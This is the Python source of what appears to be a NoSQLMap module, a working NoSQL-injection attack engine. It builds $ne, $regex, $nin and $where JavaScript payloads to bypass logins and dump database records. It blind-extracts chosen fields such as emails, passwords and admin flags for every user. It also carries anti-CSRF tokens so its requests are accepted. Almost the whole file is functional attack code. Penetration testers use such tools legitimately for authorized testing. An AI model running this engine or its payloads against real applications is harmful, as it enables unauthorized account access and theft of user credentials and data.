#!/usr/bin/env python3
# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
# See the file 'doc/COPYING' for copying permission

# Modern web NoSQL-injection engine (think "sqlmap, for NoSQL").
#
# Techniques:   boolean operator injection  +  $where JavaScript injection
# Vectors:      urlencoded form  /  JSON body  /  GET query
# Oracle:       per-target DIFFERENTIAL with N-sample noise calibration
#               (status / redirect / Set-Cookie / length / content-similarity)
# Extraction:   binary-search blind read, string + numeric + boolean types,
#               arbitrary document fields via $regex (find(req.body)) or
#               $where this.<field> (works even on strict-key logins)
# Plumbing:     persistent session + optional anti-CSRF token carried per request

import difflib
import json as _json
import random
import re
import string
import time

import requests

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass


# Sentinel meaning "substitute a fresh random value at build time".
_RANDV = object()

# Charsets for blind extraction.
_CHARSET_ALNUM = string.ascii_lowercase + string.ascii_uppercase + string.digits
_CHARSET_DEFAULT = _CHARSET_ALNUM + "@._-+ !#$%&*"
_CHARSET_FULL = _CHARSET_DEFAULT + "?/\\|~^()[]{}<>:;,'\"=`"

# Calibration samples for the noise model.
_SAMPLES = 4

# Status codes that usually mean "blocked" (WAF/ratelimit), not injection.
_BLOCKING = {403, 406, 429, 501}

# $where field-value breakout templates.  One %s is filled with a JS boolean
# expression ("true" for detection, a per-char test for extraction).
_WHERE_TEMPLATES = [
    ("sq-inline", "' || (%s) || '"),
    ("dq-inline", "\" || (%s) || \""),
    ("sq-fn", "'; return (%s); var _d='"),
    ("dq-fn", "\"; return (%s); var _d=\""),
    ("bare", " || (%s) || "),
]


def args():
    return [
        ["--extract", "Blind-extract these comma-separated document fields (e.g. email,password,role,isAdmin); fields need not be submitted by the form; multiple fields are pinned to one user"],
        ["--extractCharset", "Extraction charset: alnum, default, or full"],
        ["--extractMax", "Max characters to extract per value (default 64)"],
        ["--extractUsers", "Enumerate ALL users, not just the first (y/n)"],
        ["--extractMethod", "Extraction backend: auto (default), regex, or where ($where this.field)"],
        ["--dump", "In-band dump: re-send the match-all payload and show the records the injection returns (GET/search endpoints) (y)"],
        ["--noWhere", "Skip the $where JavaScript technique (y)"],
        ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
        ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
        ["--csrfRegex", "Regex with one capture group for the token (default: derived from --csrfField)"],
    ]


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# ---------------------------------------------------------------------------
# Transport: context (session + CSRF), request builders, probe
# ---------------------------------------------------------------------------

class Ctx:
    def __init__(self, headers=None, verify=False, csrf=None, timeout=15, session=None):
        self.session = session or requests.Session()
        self.headers = headers
        self.verify = verify
        self.csrf = csrf          # {"field","url","regex"} or None
        self.timeout = timeout


class Probe:
    def __init__(self, resp, elapsed):
        self.status = resp.status_code
        self.location = resp.headers.get("Location", "")
        self.cookies = resp.headers.get("Set-Cookie", "")
        self.body = resp.text or ""
        self.length = len(self.body)
        self.elapsed = elapsed


def _csrf_default_regex(field):
    f = re.escape(field)
    return (r'name=["\']?%s["\']?[^>]*?value=["\']([^"\']*)["\']'
            r'|value=["\']([^"\']*)["\'][^>]*?name=["\']?%s' % (f, f))


def _fetch_csrf(ctx):
    c = ctx.csrf
    try:
        r = ctx.session.get(c["url"], headers=ctx.headers, verify=ctx.verify, timeout=ctx.timeout)
    except requests.RequestException:
        return None
    rx = c.get("regex") or _csrf_default_regex(c["field"])
    m = re.search(rx, r.text)
    if not m:
        return None
    for g in m.groups():
        if g is not None:
            return g
    return None


def _formval(v):
    if v is True:
        return "true"
    if v is False:
        return "false"
    if v is None:
        return ""
    return v


def _form_ops(out, prefix, d):
    for op, v in d.items():
        key = "%s[%s]" % (prefix, op)
        if isinstance(v, dict):
            _form_ops(out, key, v)            # nested, e.g. field[$not][$regex]
        elif isinstance(v, list):
            out[key + "[]"] = [_formval(x) for x in v]
        else:
            out[key] = _formval(v)


def _build_form(fields):
    out = {}
    for name, spec in fields.items():
        if spec[0] == "lit":
            out[name] = _formval(spec[1])
        elif spec[0] == "op":
            out["%s[%s]" % (name, spec[1])] = _formval(spec[2])
        else:  # ("ops", {...}) including nested dicts / lists / bools
            _form_ops(out, name, spec[1])
    return out


def _build_json(fields):
    out = {}
    for name, spec in fields.items():
        if spec[0] == "lit":
            out[name] = spec[1]
        elif spec[0] == "op":
            out[name] = {spec[1]: spec[2]}
        else:
            out[name] = dict(spec[1])
    return out


def _send(ctx, method, url, vector, fields):
    fields = dict(fields)
    if ctx.csrf:
        token = _fetch_csrf(ctx)
        if token is not None:
            fields[ctx.csrf["field"]] = ("lit", token)
    kw = dict(headers=ctx.headers, allow_redirects=False, verify=ctx.verify, timeout=ctx.timeout)
    if method == "GET":
        kw["params"] = _build_form(fields)
    elif vector == "json":
        kw["json"] = _build_json(fields)
    else:
        kw["data"] = _build_form(fields)
    start = time.time()
    resp = ctx.session.request(method, url, **kw)
    return Probe(resp, time.time() - start)


# ---------------------------------------------------------------------------
# Oracle
# ---------------------------------------------------------------------------

def _similarity(a, b):
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).quick_ratio()


class Noise:
    # Calibrated from N known-false responses: captures the app's natural
    # variance so detection thresholds adapt instead of being hardcoded.
    def __init__(self, probes):
        self.probes = probes
        self.ref = probes[0]
        lengths = [p.length for p in probes]
        self.len_mean = sum(lengths) / len(lengths)
        self.len_spread = max(lengths) - min(lengths)
        sims = []
        for i in range(len(probes)):
            for j in range(i + 1, len(probes)):
                sims.append(_similarity(probes[i].body, probes[j].body))
        self.sim_floor = min(sims) if sims else 1.0
        self.statuses = set(p.status for p in probes)
        self.has_cookie = any(p.cookies for p in probes)


def _signal(true_p, noise):
    reasons = []
    positive = False
    if true_p.status not in noise.statuses:
        reasons.append("status %s->%s" % (sorted(noise.statuses), true_p.status))
        if true_p.status not in _BLOCKING:
            positive = True
    if true_p.location and true_p.location != noise.ref.location:
        reasons.append("redirect->%s" % true_p.location)
        positive = True
    if true_p.cookies and not noise.has_cookie:
        reasons.append("session cookie set")
        positive = True
    len_delta = abs(true_p.length - noise.len_mean)
    if len_delta > max(noise.len_spread * 3 + 20, 40):
        reasons.append("len %d vs ~%d (spread %d)" % (true_p.length, noise.len_mean, noise.len_spread))
        positive = True
    sim = max(_similarity(true_p.body, p.body) for p in noise.probes)
    if sim < min(noise.sim_floor - 0.07, 0.95):
        reasons.append("content divergence %.2f (floor %.2f)" % (sim, noise.sim_floor))
        positive = True
    return reasons, positive


def _states_differ(a, b):
    # Boolean oracle viable between a (match) and b (no-match)?
    if a.status != b.status and a.status not in _BLOCKING:
        return True
    if a.location and a.location != b.location:
        return True
    if a.cookies and not b.cookies:
        return True
    if abs(a.length - b.length) > 40:
        return True
    return _similarity(a.body, b.body) < 0.95


def _classify_true(probe, true_sig, false_sig):
    if probe.status == true_sig.status and probe.status != false_sig.status:
        return True
    if probe.status == false_sig.status and probe.status != true_sig.status:
        return False
    st = _similarity(probe.body, true_sig.body)
    sf = _similarity(probe.body, false_sig.body)
    if abs(st - sf) < 0.02:
        return abs(probe.length - true_sig.length) <= abs(probe.length - false_sig.length)
    return st > sf


# ---------------------------------------------------------------------------
# Detection candidates
# ---------------------------------------------------------------------------

def _op_specs():
    # (label, {op: value}) -- every payload is ALWAYS-TRUE (matches any document).
    return [
        ("$ne:<rand>",   {"$ne": _RANDV}),
        ("$ne:null",     {"$ne": None}),
        ("$gt:''",       {"$gt": ""}),
        ("$gte:''",      {"$gte": ""}),
        ("$regex:.*",    {"$regex": ".*"}),
        ("$nin:[rand]",  {"$nin": [_RANDV]}),
        ("$exists:true", {"$exists": True}),
        ("$not/$regex",  {"$not": {"$regex": "^$"}}),
    ]


def _resolve(v):
    if v is _RANDV:
        return _rand()
    if isinstance(v, list):
        return [_resolve(x) for x in v]
    if isinstance(v, dict):
        return {k: _resolve(x) for k, x in v.items()}
    return v


def _resolve_ops(opdict):
    return {k: _resolve(v) for k, v in opdict.items()}


def _candidates(fields_literal):
    names = list(fields_literal.keys())
    cands = []
    # A) auth-bypass: always-true operator on EVERY field at once.
    for lbl, od in _op_specs():
        spec = {n: ("ops", _resolve_ops(od)) for n in names}
        cands.append(("all-fields %s" % lbl, spec, None))
    # B) single-field operator (data endpoints like ?id=5 -> id[$ne]).
    if len(names) > 1:
        for f in names:
            for lbl, od in _op_specs():
                spec = {n: ("lit", fields_literal[n]) for n in names}
                spec[f] = ("ops", _resolve_ops(od))
                cands.append(("%s %s" % (f, lbl), spec, None))
    return cands


def _where_candidates(fields_literal):
    names = list(fields_literal.keys())
    cands = []
    for f in names:
        for tlabel, tmpl in _WHERE_TEMPLATES:
            spec = {n: ("lit", fields_literal[n]) for n in names}
            spec[f] = ("lit", tmpl % "true")
            cands.append(("$where %s/%s" % (f, tlabel), spec, {"field": f, "template": tmpl}))
    return cands


def detect(base_url, method, fields_literal, headers=None, verify=False,
           csrf=None, no_where=False, ctx=None):
    method = method.upper()
    if ctx is None:
        ctx = Ctx(headers, verify, csrf)
    vectors = ["form"] if method == "GET" else ["form", "json"]
    findings = []

    for vector in vectors:
        try:
            falses = [_send(ctx, method, base_url, vector,
                            {n: ("lit", _rand()) for n in fields_literal}) for _ in range(_SAMPLES)]
        except requests.RequestException as e:
            print("  [%s] could not reach target: %s" % (vector, e))
            continue
        noise = Noise(falses)

        cands = _candidates(fields_literal)
        if not no_where:
            cands = cands + _where_candidates(fields_literal)

        for label, spec, meta in cands:
            try:
                t = _send(ctx, method, base_url, vector, spec)
            except requests.RequestException:
                continue
            reasons, positive = _signal(t, noise)
            if not reasons:
                continue
            try:
                t2 = _send(ctx, method, base_url, vector, spec)
            except requests.RequestException:
                continue
            reasons2, positive2 = _signal(t2, noise)
            if not reasons2:
                continue
            findings.append({
                "vector": vector, "label": label, "spec": spec, "reasons": reasons2,
                "strong": positive and positive2, "status": t.status,
                "length": t.length, "where": meta,
            })
    return findings


def _payload_repr(spec, method, vector):
    if vector == "json" and method != "GET":
        return _json.dumps(_build_json(spec))
    form = _build_form(spec)
    parts = []
    for k, v in form.items():
        if isinstance(v, list):
            parts.extend("%s=%s" % (k, item) for item in v)
        else:
            parts.append("%s=%s" % (k, v))
    return "&".join(parts)


def _strip_html(s):
    s = re.sub(r"(?is)<(script|style).*?</\1>", "", s)
    s = re.sub(r"(?s)<[^>]+>", " ", s)
    out = []
    for line in s.splitlines():
        line = re.sub(r"[ \t]+", " ", line).strip()
        if line:
            out.append(line)
    return out


def dump_inband(ctx, method, base_url, vector, fields_literal, finding):
    # In-band extraction: re-send the match-all payload and surface the rows it
    # returns that a baseline (no-match) request does not -- the leaked data.
    try:
        base = _send(ctx, method, base_url, vector, {n: ("lit", _rand()) for n in fields_literal})
        full = _send(ctx, method, base_url, vector, finding["spec"])
    except requests.RequestException as e:
        print("    in-band dump error: %s" % e)
        return
    base_lines = set(_strip_html(base.body))
    leaked = [l for l in _strip_html(full.body) if l not in base_lines]
    print("\n[*] In-band dump via  %s" % _payload_repr(finding["spec"], method, finding["vector"]))
    print("    %d line(s) returned by the match-all query that the baseline did not:" % len(leaked))
    for l in leaked:
        print("      " + l)


# ---------------------------------------------------------------------------
# Extraction
# ---------------------------------------------------------------------------

def _char_class(chars):
    esc = "".join("\\" + c if c in "\\]^-" else c for c in chars)
    return "[" + esc + "]"


def _walk_value(is_true, charset, maxlen, label=""):
    # Binary-search each character: ~log2(len(charset)) requests per char.
    value = ""
    while len(value) < maxlen:
        if not is_true("^" + re.escape(value) + _char_class(charset)):
            break
        chars = list(charset)
        lo, hi = 0, len(chars)
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if is_true("^" + re.escape(value) + _char_class(chars[lo:mid])):
                hi = mid
            else:
                lo = mid
        value += chars[lo]
        if label:
            print("\r    %s: %s" % (label, value), end="")
    if label:
        print("")
    return value


def _regex_ops(pattern, exclude):
    d = {"$regex": pattern}
    if exclude:
        d["$nin"] = list(exclude)
    return d


def _field_probe(ctx, method, url, vector, fields_literal, field, target_spec, pin, exclude_self=True):
    spec = {}
    for n in fields_literal:
        spec[n] = ("op", "$ne", _rand())          # companions always-true
    for n, val in (pin or {}).items():
        if not (exclude_self and n == field):
            spec[n] = ("lit", val)
    spec[field] = target_spec
    return _send(ctx, method, url, vector, spec)


def _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, exclude):
    def probe(pattern):
        return _field_probe(ctx, method, base_url, vector, fields_literal, field,
                            ("ops", _regex_ops(pattern, exclude)), pin)
    try:
        true_sig = probe(".*")
        false_sig = probe("^" + _rand(16) + "$")
    except requests.RequestException:
        return None
    if not _states_differ(true_sig, false_sig):
        return None

    def is_true(pattern):
        try:
            return _classify_true(probe(pattern), true_sig, false_sig)
        except requests.RequestException:
            return False
    return is_true


def _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude):
    # Non-string fields: numeric (bisection) and boolean.
    def probe(target_spec):
        return _field_probe(ctx, method, base_url, vector, fields_literal, field, target_spec, pin)
    try:
        ref_true = probe(("ops", {"$exists": True}))
        ref_false = probe(("lit", _rand(16)))
    except requests.RequestException:
        return None
    if not _states_differ(ref_true, ref_false):
        return None

    def gte(n):
        try:
            return _classify_true(probe(("ops", {"$gte": n})), ref_true, ref_false)
        except requests.RequestException:
            return False

    LO, HI = -(1 << 52), (1 << 52)
    if gte(LO) and not gte(HI):          # looks numeric
        lo, hi = LO, HI
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if gte(mid):
                lo = mid
            else:
                hi = mid
        return lo                        # largest n with field>=n -> the value

    for bval in (True, False):           # boolean
        try:
            if _classify_true(probe(("lit", bval)), ref_true, ref_false):
                return bval
        except requests.RequestException:
            pass
    return None


def _where_is_true(ctx, method, base_url, vector, fields_literal, inj_field, template, target):
    def probe(testexpr):
        spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
        spec[inj_field] = ("lit", template % testexpr)
        return _send(ctx, method, base_url, vector, spec)
    try:
        true_sig = probe("true")
        false_sig = probe("false")
    except requests.RequestException:
        return None
    if not _states_differ(true_sig, false_sig):
        return None

    def is_true(pattern):
        js_pat = pattern.replace("/", "\\/")
        js = "this.%s!=null && /%s/.test(String(this.%s))" % (target, js_pat, target)
        try:
            return _classify_true(probe(js), true_sig, false_sig)
        except requests.RequestException:
            return False
    return is_true


def extract(base_url, method, vector, fields_literal, field, headers=None, verify=False,
            charset=None, maxlen=64, exclude=None, pin=None, ctx=None, where=None,
            ext_method="auto"):
    if ctx is None:
        ctx = Ctx(headers, verify)
    charset = charset or _CHARSET_DEFAULT

    if ext_method in ("auto", "regex"):
        is_true = _regex_is_true(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
        if is_true:
            return _walk_value(is_true, charset, maxlen, label=field)
        typed = _extract_typed(ctx, method, base_url, vector, fields_literal, field, pin, exclude)
        if typed is not None:
            print("    %s = %s (typed)" % (field, typed))
            return str(typed)

    if where and ext_method in ("auto", "where"):
        wis = _where_is_true(ctx, method, base_url, vector, fields_literal,
                             where["field"], where["template"], field)
        if wis:
            return _walk_value(wis, charset, maxlen, label=field)
    return None


def extract_record(base_url, method, vector, fields_literal, field_list, headers=None,
                   verify=False, charset=None, maxlen=64, exclude_first=None,
                   ctx=None, where=None, ext_method="auto"):
    if ctx is None:
        ctx = Ctx(headers, verify)
    record = {}
    pin = {}
    for i, f in enumerate(field_list):
        v = extract(base_url, method, vector, fields_literal, f, charset=charset, maxlen=maxlen,
                    exclude=(exclude_first if i == 0 else None), pin=dict(pin),
                    ctx=ctx, where=where, ext_method=ext_method)
        record[f] = v
        if i == 0 and v is None:
            break
        if v is not None:
            pin[f] = v
    return record


def extract_records(base_url, method, vector, fields_literal, field_list, headers=None,
                    verify=False, charset=None, maxlen=64, ctx=None, where=None, ext_method="auto"):
    if ctx is None:
        ctx = Ctx(headers, verify)
    records = []
    seen = []
    while True:
        rec = extract_record(base_url, method, vector, fields_literal, field_list,
                             charset=charset, maxlen=maxlen, exclude_first=list(seen),
                             ctx=ctx, where=where, ext_method=ext_method)
        v0 = rec.get(field_list[0])
        if not v0 or v0 in seen:
            break
        seen.append(v0)
        records.append(rec)
        print("    [+] record %d: %s" % (len(records),
              ", ".join("%s=%s" % (k, rec[k]) for k in field_list)))
    return records


def extract_users(base_url, method, vector, fields_literal, field, headers=None, verify=False,
                  charset=None, maxlen=64, ctx=None, where=None, ext_method="auto"):
    if ctx is None:
        ctx = Ctx(headers, verify)
    found = []
    while True:
        v = extract(base_url, method, vector, fields_literal, field, charset=charset, maxlen=maxlen,
                    exclude=found, ctx=ctx, where=where, ext_method=ext_method)
        if not v or v in found:
            break
        found.append(v)
        print("    [+] %s[%d] = %s" % (field, len(found), v))
    return found


def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method):
    if not strong:
        return
    raw = None
    multi = False
    charset = _CHARSET_DEFAULT
    maxlen = 64

    if args is not None:
        raw = getattr(args, "extract", None)
        if not raw:
            return
        cs = (getattr(args, "extractCharset", None) or "default").lower()
        charset = {"alnum": _CHARSET_ALNUM, "full": _CHARSET_FULL}.get(cs, _CHARSET_DEFAULT)
        try:
            maxlen = int(getattr(args, "extractMax", None) or 64)
        except (ValueError, TypeError):
            maxlen = 64
        multi = str(getattr(args, "extractUsers", "") or "").lower() == "y"
    else:
        if input("\nBlind-extract field value(s)? (y/n) ").lower() != "y":
            return
        raw = input("Field(s), comma-separated (e.g. email,password,role): ").strip()
        multi = input("Enumerate ALL users, not just the first? (y/n) ").lower() == "y"

    field_list = [f.strip() for f in raw.split(",") if f.strip()]
    if not field_list:
        print("No fields specified to extract.")
        return
    extra = [f for f in field_list if f not in fields_literal]
    if extra:
        print("Note: %s not submitted by the form; will try via find(req.body) and $where this.field."
              % ", ".join(extra))

    vector = strong[0]["vector"]
    where = next((f["where"] for f in findings if f.get("where")), None)
    if ext_method == "regex":
        where = None
    if ext_method == "where" and not where:
        print("No $where injection confirmed; cannot force --extractMethod where.")
        return

    print("\n[*] Extracting %s via %s vector (method=%s, charset=%d, max=%d)..."
          % (field_list, vector, ext_method, len(charset), maxlen))

    if multi:
        if len(field_list) == 1:
            vals = extract_users(base_url, method, vector, fields_literal, field_list[0],
                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
            print("[+] Recovered %d value(s): %s" % (len(vals), ", ".join(vals) if vals else "(none)"))
        else:
            recs = extract_records(base_url, method, vector, fields_literal, field_list,
                                   charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
            print("[+] Recovered %d record(s):" % len(recs))
            for r in recs:
                print("    " + ", ".join("%s=%s" % (k, r.get(k)) for k in field_list))
    else:
        if len(field_list) == 1:
            v = extract(base_url, method, vector, fields_literal, field_list[0],
                        charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
            print("[+] %s = %s" % (field_list[0], v) if v is not None
                  else "[-] Could not establish an extraction oracle for '%s'." % field_list[0])
        else:
            rec = extract_record(base_url, method, vector, fields_literal, field_list,
                                 charset=charset, maxlen=maxlen, ctx=ctx, where=where, ext_method=ext_method)
            print("[+] Recovered record (one user):")
            for k in field_list:
                print("    %s = %s" % (k, rec.get(k)))


def run(base_url, method, fields_literal, headers=None, verify=False, args=None):
    fields_literal = dict(fields_literal)
    csrf = None
    no_where = False
    ext_method = "auto"
    if args is not None:
        cf = getattr(args, "csrfField", None)
        if cf:
            csrf = {"field": cf, "url": getattr(args, "csrfUrl", None) or base_url,
                    "regex": getattr(args, "csrfRegex", None)}
        no_where = str(getattr(args, "noWhere", "") or "").lower() == "y"
        ext_method = (getattr(args, "extractMethod", None) or "auto").lower()

    if csrf:
        fields_literal.pop(csrf["field"], None)

    print("Modern NoSQL Web Injection (boolean + $where, differential oracle)")
    print("=================================================================")
    print("Target: %s [%s]" % (base_url, method.upper()))
    print("Fields: %s" % (", ".join(fields_literal.keys()) or "(none)"))
    if csrf:
        print("CSRF  : carrying '%s' from %s on every request" % (csrf["field"], csrf["url"]))
    print("")

    if not fields_literal:
        print("No parameters to test.  Provide query params (GET) or POST data.")
        if args is None:
            input("\nPress enter to continue...")
        return []

    ctx = Ctx(headers, verify, csrf)
    findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx)

    print("")
    strong = [f for f in findings if f["strong"]]
    weak = [f for f in findings if not f["strong"]]

    if not strong and not weak:
        print("No NoSQL injection detected.")
    else:
        if strong:
            seen = set()
            print("=== NoSQL INJECTION CONFIRMED ===")
            for f in strong:
                key = (f["vector"], f["label"])
                if key in seen:
                    continue
                seen.add(key)
                print("[+] %s  (%s vector)" % (f["label"], f["vector"]))
                print("    signals : %s" % "; ".join(f["reasons"]))
                print("    payload : %s" % _payload_repr(f["spec"], method, f["vector"]))

            ab = [f for f in strong if f["label"].startswith("all-fields")]
            if ab:
                print("\n[!] ALL-FIELDS operator injection: on a login this authenticates with")
                print("    no credentials; on a search/data endpoint it returns every document.")
                print("    Reproduce: %s" % _payload_repr(ab[0]["spec"], method, ab[0]["vector"]))
            if any(f["label"].startswith("$where") for f in strong):
                print("\n[!] $where JAVASCRIPT injection confirmed: arbitrary fields are")
                print("    extractable via this.<field> (even fields the form never submits).")

        if weak:
            print("\n=== POSSIBLE (status-only change, may be a WAF) ===")
            for f in weak:
                print("[?] %s (%s): %s" % (f["label"], f["vector"], "; ".join(f["reasons"])))

    # In-band dump: re-send the match-all payload and show the returned records.
    do_dump = False
    if args is not None:
        do_dump = str(getattr(args, "dump", "") or "").lower() == "y"
    elif strong:
        do_dump = input("\nDump in-band data (re-send match-all, show returned records)? (y/n) ").lower() == "y"
    if do_dump and strong:
        ab = [f for f in strong if f["label"].startswith("all-fields")] or strong
        dump_inband(ctx, method, base_url, ab[0]["vector"], fields_literal, ab[0])

    _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args, ext_method)

    if args is None:
        input("\nPress enter to continue...")
    return findings
